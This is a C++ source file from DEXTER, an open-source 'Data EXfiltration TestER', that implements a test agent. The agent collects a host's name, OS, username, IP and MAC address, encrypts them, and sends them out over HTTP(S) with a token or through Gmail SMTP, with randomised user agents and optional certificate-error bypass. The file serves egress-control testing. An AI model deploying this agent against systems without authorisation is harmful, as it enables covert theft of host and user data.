//DEXTER - Data EXfiltration TestER
//This file is part of DEXTER Project

//Written by : @maldevel
//Website : https ://www.twelvesec.com/
//GIT : https://github.com/twelvesec/dexter

//TwelveSec(@Twelvesec)

//This program is free software : you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see < http://www.gnu.org/licenses/>.

//For more see the file 'LICENSE' for copying permission.

#include "libagent.h"
#include "libhttp.h"
#include "libHash.h"
#include "rapidjson/document.h"
#include "helper.h"
#include "libsysteminfo.h"
#include "libcrypt.h"
#include "libencode.h"
#include "libcurl.h"

#include <iostream>

static std::wstring pick_random_useragent(std::set<std::wstring> uagents, std::wstring Protocol) {

	std::wstring useragent = helper::pick_random_useragent_fromfile(uagents);
	std::wcout << L"[" << Protocol << L"] " << L"User-Agent: " << useragent << std::endl;

	return useragent;
}

static std::string generate_data(std::string PoC_KEYWORD, std::string aespassword, std::wstring Protocol) {

	std::wcout << "[" << Protocol << "] " << "Collecting System Information" << std::endl;

	std::string computername = libsysteminfo::get_computer_name();
	std::string osversion = libsysteminfo::get_os_version();
	std::string username = libsysteminfo::get_username();
	std::string ipaddress = libsysteminfo::get_active_netface_ip();
	std::string macaddress = libsysteminfo::get_active_netface_mac();

	std::string uid = libHash::sha256("^" + computername + "." + osversion + "." + username + "$");

	if (computername == "" || osversion == "" || username == "" || uid == "" || ipaddress == "" || macaddress == "") {

		std::wcout << "[" << Protocol << "] " << "Collecting System Information failed" << std::endl;
	}

	std::string proto(Protocol.begin(), Protocol.end());

	std::string encrypted_data = "data=" + libcrypt::encrypt(aespassword, "UID=" + uid + "&ComputerName=" + computername +
		"&OS=" + osversion + "&Username=" + username +
		"&LocalIPAddress=" + ipaddress + "&PhysicalAddress=" + macaddress +
		"&PoCKEYWORD=" + PoC_KEYWORD + "&Protocol=" + proto);

	std::string encoded = libencode::url_encode(encrypted_data);
	encrypted_data = "";

	return encoded;
}

void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring token_uri_method, std::wstring logclient_uri_method,
	std::wstring tokenuri,
	std::wstring logclienturi, std::set<std::wstring> uagents, WORD clientid, std::string secret, std::string username,
	std::string password, std::string aespassword, std::string PoC_KEYWORD, bool IGNORE_CERT_UNKNOWN_CA,
	bool IGNORE_CERT_DATE_INVALID, bool HTTPS_CONNECTION) {

	char *downloaded = 0;
	HINTERNET internet = NULL, connection = NULL, request = NULL;
	const WCHAR *token_headers = L"Accept: application/json\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n";
	bool result = false;

	std::wstring useragent = pick_random_useragent(uagents, HTTPS_CONNECTION ? L"HTTPS" : L"HTTP");

	std::string token_data = "grant_type=password&client_id=" + std::to_string(clientid) + "&client_secret=" +
		secret + "&username=" + username + "&password=" + password + "&scope=*";

	if (!HTTPS_CONNECTION) {
		std::wcout << "[HTTP] " << "Connecting to HTTP server" << std::endl;
	}
	else {
		std::wcout << "[HTTPS] " << "Connecting to HTTPS server" << std::endl;
	}

	internet = libhttp::open(useragent);

	if (internet != NULL) {
		connection = libhttp::connect(internet, host, port);
	}

	if (!HTTPS_CONNECTION) {
		std::wcout << "[HTTP] " << "Warning! Transmitting unencrypted data over HTTP" << std::endl;
	}

	if (!HTTPS_CONNECTION) {
		std::wcout << "[HTTP] " << "Requesting API token with HTTP packet" << std::endl;
	}
	else {
		std::wcout << "[HTTPS] " << "Requesting API token with HTTPS packet" << std::endl;
	}

	if (connection != NULL) {
		request = libhttp::json_request(connection, token_uri_method, tokenuri, (char*)token_data.c_str(), token_headers, IGNORE_CERT_UNKNOWN_CA,
			IGNORE_CERT_DATE_INVALID, HTTPS_CONNECTION);
	}

	if (request != NULL) {
		result = libhttp::retrieve_data(request, &downloaded);
	}

	if (result && downloaded != NULL) {

		rapidjson::Document token_response;
		token_response.Parse(downloaded);

		HeapFree(GetProcessHeap(), 0, downloaded);
		downloaded = NULL;

		std::wstring access_token = helper::read_string_value(&token_response, "access_token");
		std::wstring logclient_headers = L"Accept: application/json\r\nContent-Type: application/x-www-form-urlencoded\r\nAuthorization: Bearer " +
			access_token + L"\r\nConnection: close\r\n";

		std::string encoded = generate_data(PoC_KEYWORD, aespassword, HTTPS_CONNECTION ? L"HTTPS" : L"HTTP");

		if (!HTTPS_CONNECTION) {
			std::wcout << "[HTTP] " << "Sending data with HTTP packet" << std::endl;
		}
		else {
			std::wcout << "[HTTPS] " << "Sending data with HTTPS packet" << std::endl;
		}

		if (connection != NULL) {
			request = libhttp::json_request(connection, logclient_uri_method, logclienturi, (char*)encoded.c_str(),
				logclient_headers.c_str(), IGNORE_CERT_UNKNOWN_CA, IGNORE_CERT_DATE_INVALID, HTTPS_CONNECTION);
		}

		encoded = "";

		if (request != NULL) {
			result = libhttp::retrieve_data(request, &downloaded);
		}

		if (result && downloaded != NULL) {
			rapidjson::Document logclient_response;
			logclient_response.Parse(downloaded);

			if (helper::read_bool_value(&logclient_response, "success") == true) {

				if (!HTTPS_CONNECTION) {
					std::wcout << "[HTTP] " << "Transmission succeeded" << std::endl;
				}
				else {
					std::wcout << "[HTTPS] " << "Transmission succeeded" << std::endl;
				}
			}
			else {

				if (!HTTPS_CONNECTION) {
					std::wcout << "[HTTP] " << "Transmission failed" << std::endl;
				}
				else {
					std::wcout << "[HTTPS] " << "Transmission failed" << std::endl;
				}
			}
		}

		if (downloaded) {
			HeapFree(GetProcessHeap(), 0, downloaded);
			downloaded = NULL;
		}

	}

	if (request) {
		InternetCloseHandle(request);
		request = NULL;
	}

	if (connection) {
		InternetCloseHandle(connection);
		connection = NULL;
	}

	if (internet) {
		InternetCloseHandle(internet);
		internet = NULL;
	}
}

void libagent::test_gmail_protocol(std::string gmail_smtp, std::string gmail_username, std::string gmail_password, std::string gmail_name,
	std::set<std::wstring> uagents, std::string aespassword, std::string PoC_KEYWORD) {

	libcurl::init();

	std::wstring useragent = pick_random_useragent(uagents, L"GMAIL");

	std::string encoded = generate_data(PoC_KEYWORD, aespassword, L"GMAIL");

	std::wcout << "[GMAIL] " << "Connecting to GMAIL SMTP server" << std::endl;

	std::wcout << "[GMAIL] " << "Sending data with GMAIL packet" << std::endl;

	std::string uagent(useragent.begin(), useragent.end());

	;

	if (libcurl::send_email(gmail_username, gmail_password, gmail_smtp, gmail_name, PoC_KEYWORD, encoded, uagent)) {
		std::wcout << "[GMAIL] " << "Transmission succeeded" << std::endl;
	}
	else {
		std::wcout << "[GMAIL] " << "Transmission failed" << std::endl;
	}

	libcurl::finalize();
}
